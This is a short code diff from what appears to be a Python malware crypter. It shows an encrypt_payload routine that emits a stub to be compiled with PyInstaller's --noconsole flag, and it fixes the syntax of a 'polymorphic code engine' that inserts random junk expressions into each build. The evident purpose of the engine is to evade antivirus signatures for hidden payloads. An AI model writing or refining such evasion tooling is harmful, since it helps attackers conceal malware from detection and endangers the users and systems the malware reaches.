@@ -87,7 +87,7 @@ def encrypt_payload(payload_path, output_stub_path):
     print("[🔧] Compile with: pyinstaller --onefile --noconsole --clean stub.py")
 
 # ========================
-# POLYMORPHIC CODE ENGINE
+# POLYMORPHIC CODE ENGINE (FIXED)
 # ========================
 def generate_polymorphic_junk():
     """Generate random junk code that changes on each build"""
@@ -98,13 +98,17 @@ def generate_polymorphic_junk():
     math_ops = ['+', '-', '*', '//', '%', '&', '|', '^']
     vars = ['var'+str(i) for i in range(1, 20)]
     
-    # Generate random math expressions
+    # Generate random math expressions - FIXED SYNTAX
     for _ in range(random.randint(20, 40)):
         var = random.choice(vars)
         expr = f"{var} = "
-        for _ in range(random.randint(3, 8)):
-            expr += f"{random.randint(0, 1000)} {random.choice(math_ops)} "
-        expr = expr.rsplit(' ', 1)[0]  # Remove last operator
+        num_terms = random.randint(3, 8)
+        # Generate complete expressions (number-operator pairs)
+        for term_index in range(num_terms):
+            expr += str(random.randint(0, 1000))
+            # Add operator unless it's the last term
+            if term_index < num_terms - 1:
+                expr += " " + random.choice(math_ops) + " "
         junk_patterns.append(expr + "\n")
     
     # Generate useless function definitions
